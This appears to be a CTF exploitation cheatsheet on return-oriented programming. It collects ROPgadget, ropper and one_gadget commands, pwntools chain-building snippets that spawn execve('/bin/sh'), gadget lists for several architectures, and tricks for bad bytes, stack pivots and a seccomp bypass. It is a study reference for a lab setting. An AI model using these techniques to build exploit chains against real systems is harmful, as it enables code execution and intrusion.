---
title: "ROP Gadgets - Hunting, Shopping Lists and Chaining"
category: pwn
subcategory: rop
type: cheatsheet
tags: [rop, ropgadget, ropper, one-gadget, rop-chain, ret2libc, syscall, sysenter, stack-pivot, nx, aslr, pie, relro, got, plt, pwntools, gef, pwndbg, srop, ret2csu]
summary: "ROPgadget/ropper/one_gadget invocations, the per-architecture gadget shopping list, syscall vs sysenter, and how to chain under constraints."
tools: [ropgadget, ropper, one-gadget, pwntools, ropr, gef, pwndbg, objdump, readelf]
related: [rop-fundamentals, rop-ret2libc, rop-ret2csu, rop-srop, rop-stack-pivot, rop-static-binary, rop-one-gadget, pwntools-cheatsheet, gdb-gef-pwndbg-cheatsheet]
---

## ROPgadget

```bash
# Dump everything (always redirect - it is thousands of lines)
ROPgadget --binary ./vuln > gadgets.txt

# Grep-style search (regex, Intel syntax, ';' separated)
ROPgadget --binary ./vuln --only 'pop|ret'
ROPgadget --binary ./vuln --only 'pop|pop|ret'
ROPgadget --binary ./vuln --string '/bin/sh'
ROPgadget --binary ./vuln --string 'sh'
ROPgadget --binary ./vuln --re 'pop rdi'
ROPgadget --binary ./vuln --re '^pop r.i ; ret$'
ROPgadget --binary ./vuln --re 'mov qword ptr \[r.i\], r.i'

# Tune the search
ROPgadget --binary ./vuln --depth 12          # instructions per gadget (default 10)
ROPgadget --binary ./vuln --all               # do not deduplicate
ROPgadget --binary ./vuln --nojop --norop     # only syscall gadgets
ROPgadget --binary ./vuln --nosys --nojop     # only plain ROP
ROPgadget --binary ./vuln --badbytes '00|0a|20'
ROPgadget --binary ./vuln --range 0x400000-0x401000
ROPgadget --binary ./vuln --offset 0x555555554000   # rebase PIE output
ROPgadget --binary ./vuln --align 8
ROPgadget --binary ./vuln --multibr           # allow multiple branches in a gadget
ROPgadget --binary ./vuln --memstr '/bin/sh'  # build the string from single bytes

# Auto-build an execve chain (works surprisingly often on static i386)
ROPgadget --binary ./vuln --ropchain

# Raw shellcode blob instead of an ELF
ROPgadget --binary ./dump.bin --rawArch=x86 --rawMode=64 --rawEndian=little
```

## ropper

```bash
ropper -f ./vuln                              # dump all
ropper -f ./vuln --search 'pop rdi'
ropper -f ./vuln --search 'pop r?i; ret'      # ? = one char wildcard
ropper -f ./vuln --search '% ret'             # % = any instructions
ropper -f ./vuln --search 'mov [%], r??'
ropper -f ./vuln --quality 1                  # only minimal gadgets
ropper -f ./vuln --inst-count 6
ropper -f ./vuln --type rop                   # rop | jop | sys | all
ropper -f ./vuln --type sys
ropper -f ./vuln --jmp rsp                    # jmp/call reg gadgets
ropper -f ./vuln --jmp rax,rsp
ropper -f ./vuln --string '/bin/sh'
ropper -f ./vuln --opcode 0f05                # find raw bytes (syscall)
ropper -f ./vuln --opcode ffe4                # jmp esp
ropper -f ./vuln --badbytes '000a20'
ropper -f ./vuln --nocolor > gadgets.txt
ropper -f ./vuln -I 0x555555554000            # image base for PIE
ropper -f ./vuln --chain execve               # auto chain generator
ropper -f ./vuln --chain 'execve cmd=/bin/sh'
ropper -f ./vuln --chain mprotect
ropper -f ./libc.so.6 --search 'pop rdx'

# Interactive console (tab completion over the gadget DB)
ropper
# >>> file ./vuln
# >>> search pop rdi
# >>> arch x86_64
```

## ropr (fast Rust alternative)

```bash
ropr ./vuln
ropr -R 'pop rdi; ret' ./vuln
ropr --nouniq --noisy ./vuln
ropr -j ./vuln            # include jop gadgets
```

## one_gadget

```bash
one_gadget ./libc.so.6
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget -l 2 ./libc.so.6        # level 2 = more (looser) candidates
one_gadget -l 1 ./libc.so.6
one_gadget -f execve ./libc.so.6   # only execve-based
one_gadget -n 3 ./libc.so.6        # show at most 3
one_gadget -r ./libc.so.6          # raw addresses only, one per line
one_gadget -b 3a6cd ./libc.so.6    # look up by build id
one_gadget --base 0x7ffff7a00000 ./libc.so.6   # print rebased addresses

# Feed straight into a script
ONEG=$(one_gadget -r ./libc.so.6 | head -1)
```

Typical output and what the constraints mean:

```text
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
  constraints:
    rsp & 0xf == 0            -> stack must be 16-byte aligned
    rcx == NULL               -> zero rcx before jumping

0x4f432 execve("/bin/sh", rsp+0x40, environ)
  constraints:
    [rsp+0x40] == NULL        -> that stack slot must hold 0

0x10a41c execve("/bin/sh", rsp+0x70, environ)
  constraints:
    [rsp+0x70] == NULL

0xe3b04 execve("/bin/sh", r14, r12)
  constraints:
    [r14] == NULL || r14 == NULL
    [r12] == NULL || r12 == NULL
```

## Reading gadgets straight out of objdump

```bash
# Every 'ret' and the two instructions before it
objdump -d --no-show-raw-insn -M intel ./vuln | grep -B2 'ret'

# Find the byte sequence for common gadgets
#   5f c3          pop rdi ; ret
#   5e c3          pop rsi ; ret
#   5a c3          pop rdx ; ret
#   58 c3          pop rax ; ret
#   c3             ret
#   c9 c3          leave ; ret
#   0f 05          syscall
#   cd 80          int 0x80
#   0f 34          sysenter
#   ff e4          jmp esp
#   ff e0          jmp eax
#   94 c3          xchg eax, esp ; ret
objdump -d ./vuln | grep -E '5f c3|5e c3|0f 05'

# Search the raw file for opcodes (works on stripped blobs too)
xxd -p ./vuln | tr -d '\n' | grep -obE '5fc3' | head

# readelf to find where the executable segments are
readelf -l ./vuln
readelf -S ./vuln | grep -E 'text|plt|got|data|bss'
readelf -r ./vuln          # relocations - GOT/PLT entries
readelf --dyn-syms ./vuln
```

## pwntools gadget API

```python
from pwn import *
context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP([elf, libc])

pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi  = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx  = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax  = rop.find_gadget(['pop rax', 'ret'])[0]
syscall  = rop.find_gadget(['syscall', 'ret'])[0]
leave    = rop.find_gadget(['leave', 'ret'])[0]
ret      = rop.find_gadget(['ret'])[0]

# Search raw bytes anywhere in the mapped ELF
pop_rdi = next(elf.search(asm('pop rdi; ret')))
jmp_rsp = next(elf.search(asm('jmp rsp')))
binsh   = next(libc.search(b'/bin/sh\x00'))

# Register-assignment interface: pwntools solves the gadget chain for you
rop.rdi = binsh
rop.rsi = 0
rop.rdx = 0
rop.call(libc.sym['execve'])
print(rop.dump())

# Bad character filtering at chain-build time
rop = ROP(elf, badchars=b'\x00\x0a\x20')
```

## Shopping list: x86-64 (System V)

Argument registers in order: `rdi, rsi, rdx, rcx, r8, r9`. Syscall number in `rax`,
4th syscall arg in `r10` (not rcx). Return value in `rax`.

```text
MUST HAVE
  pop rdi ; ret                     arg1
  ret                               stack alignment (movaps fix)

STRONGLY WANTED
  pop rsi ; ret                     arg2   (often: pop rsi ; pop r15 ; ret)
  pop rdx ; ret                     arg3   (rare in small binaries -> ret2csu / SROP)
  pop rax ; ret                     syscall number
  syscall ; ret  /  syscall
  pop rcx ; ret
  pop r8 ; ret  /  pop r9 ; ret

WRITE-WHAT-WHERE
  mov qword ptr [rdi], rsi ; ret
  mov qword ptr [rdi], rax ; ret
  mov [rax], rdx ; ret
  mov dword ptr [rdi], esi ; ret

STACK PIVOT
  leave ; ret                       rsp = rbp ; pop rbp
  pop rsp ; ret
  xchg rax, rsp ; ret
  add rsp, 0x38 ; ret
  mov rsp, rbp ; pop rbp ; ret

ARITHMETIC / ZEROING
  xor rax, rax ; ret
  xor rdx, rdx ; ret
  add rax, rdx ; ret
  inc rax ; ret  /  inc eax ; ret
  cdq                               sign-extend eax into edx (zeroes rdx if eax>=0)

UNIVERSAL (when pop rdx is missing)
  __libc_csu_init tail:   pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
  __libc_csu_init body:   mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]
```

## Shopping list: i386 (cdecl)

Arguments on the stack, right to left. Syscall: `int 0x80` with
`eax=nr, ebx, ecx, edx, esi, edi, ebp`.

```text
  ret
  pop ebx ; ret
  pop ecx ; pop ebx ; ret
  pop edx ; ret
  pop eax ; ret
  int 0x80
  pop esi ; pop edi ; pop ebp ; ret     (generic 3-slot cleanup)
  leave ; ret
  xchg eax, esp ; ret                   (0x94 0xc3)
  add esp, 0x10 ; ret
  mov dword ptr [edx], eax ; ret
  jmp esp                               (0xff 0xe4)
  call esp / call eax

Classic no-gadget ret2libc layout (cdecl needs no pop at all):
  [padding][system][exit_or_junk][ptr_to_"/bin/sh"]
Chained calls need a pop-per-arg cleanup gadget between them:
  [f1][pop;ret][arg1][f2][pop;ret][arg1]
```

## Shopping list: ARM32 / Thumb

Args in `r0-r3`, syscall number in `r7`, `svc #0`. Return address in `lr`;
a function that spills lr is the ROP entry point.

```text
  pop {r0, pc}
  pop {r0, r1, r2, r3, pc}
  pop {r3, pc}
  pop {r4, r5, r6, r7, r8, pc}        (gives r7 = syscall number)
  pop {r7, pc}
  svc #0                              (0x00 0x00 0x00 0xef in ARM mode)
  blx r3 / bx r0
  mov sp, r7 ; pop {r4, pc}           pivot
  ldm sp!, {r0, pc}

Thumb mode: set bit 0 of the target address. `svc #0` is 0xdf 0x00.
ARM syscall numbers differ from x86 - use the EABI table.
```

```bash
ropper -f ./vuln --search 'pop {r0'
ROPgadget --binary ./vuln --thumb
ropper -f ./vuln --arch ARMTHUMB
```

## Shopping list: AArch64

Args in `x0-x7`, syscall number in `x8`, `svc #0`. Return address in `x30` (lr).
Gadgets end in `ret` (which is `br x30`), so you usually need a
`ldp x29, x30, [sp], #N ; ret` gadget to keep control.

```text
  ldp x29, x30, [sp], #0x10 ; ret      the universal "pop pc" on aarch64
  ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
  mov x0, x19 ; blr x20
  ldr x0, [sp, #N] ; ret
  svc #0                               (0x01 0x00 0x00 0xd4)
  blr x8 / br x2
```

```bash
ropper -f ./vuln --arch ARM64 --search 'ldp x29'
ROPgadget --binary ./vuln --depth 15
```

## Shopping list: MIPS

Args in `$a0-$a3`, syscall number in `$v0`, `syscall` instruction.
Return address in `$ra`. Every branch/jump has a DELAY SLOT that executes first.

```text
  lw $ra, N($sp) ; ... ; jr $ra
  lw $s0, N($sp) ; ... ; jr $s0
  addiu $a0, $sp, N ; ... ; jalr $t9
  li $v0, 4011 ; syscall               (execve on o32)
  move $t9, $s0 ; jalr $t9

MIPS o32 syscall base is 4000: execve = 4011, read = 4003, write = 4004.
Watch the delay slot: the instruction AFTER jr/jalr runs before the jump lands.
Cache incoherency: self-modifying/injected code may need a cacheflush syscall.
```

```bash
ropper -f ./vuln --arch MIPS
ROPgadget --binary ./vuln --depth 14
```

## syscall vs sysenter vs int 0x80

```text
x86-64  syscall        0f 05    rax=nr, rdi rsi rdx r10 r8 r9, clobbers rcx/r11
i386    int 0x80       cd 80    eax=nr, ebx ecx edx esi edi ebp   (slow, always works)
i386    sysenter       0f 34    needs a valid return frame; usually via __kernel_vsyscall
x32 ABI syscall        0f 05    rax = 0x40000000 | nr  (32-bit syscalls from 64-bit code)

An i386 binary running on a 64-bit kernel can still use int 0x80.
A 64-bit binary can invoke the 32-bit table via the x32 bit - useful to bypass
seccomp filters that only whitelist/blacklist the plain 64-bit numbers.
```

```bash
# Find them
ROPgadget --binary ./vuln --only 'syscall'
ropper -f ./vuln --opcode 0f05
ropper -f ./vuln --opcode cd80
ropper -f ./vuln --opcode 0f34
```

## Chaining under constraints

```text
BAD BYTES
  \x00   gets/strcpy/sprintf stop here      -> pick gadgets without null bytes,
                                               or put them LAST in the chain
  \x0a   gets/fgets/scanf("%s") stop here
  \x20 \x09 \x0b \x0c \x0d   scanf("%s") stops on any whitespace
  Tools: ROPgadget --badbytes, ropper --badbytes, ROP(elf, badchars=...)

SHORT OVERFLOW (only 1-3 slots after the saved rip)
  -> stack pivot: read() a big chain into .bss, then leave;ret or pop rsp;ret

NO pop rdx
  -> ret2csu, SROP, or a libc gadget (libc always has pop rdx ; ret somewhere)

NO /bin/sh STRING
  -> write it yourself with a mov [reg], reg gadget into .bss/.data
  -> or use ROPgadget --memstr '/bin/sh' to assemble it byte by byte
  -> or call execve("/bin/sh") via a one_gadget
  -> or use "sh\x00" which exists inside longer libc strings

STACK ALIGNMENT (movaps SIGSEGV inside system/printf on glibc >= 2.27)
  -> insert a bare `ret` gadget before the libc call so rsp % 16 == 0 at entry

PIE
  -> every gadget address must have elf.address added; set elf.address after a leak

FULL RELRO
  -> GOT is read-only; pivot to a ROP chain or overwrite a function pointer instead
```

## Verify a chain before you fire it

```python
from pwn import *
context.binary = elf = ELF('./vuln')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())          # read this line by line - it is annotated

# Disassemble a gadget you are unsure about
print(disasm(elf.read(0x401234, 16)))

# Check there are no bad bytes
chain = rop.chain()
assert not any(b in chain for b in b'\x00\x0a'), 'bad byte in chain'
```

```gdb
# Step the chain in gdb: break on the ret, then `si` once per gadget
b *vuln+<off_of_ret>
c
telescope $rsp 30
si
```
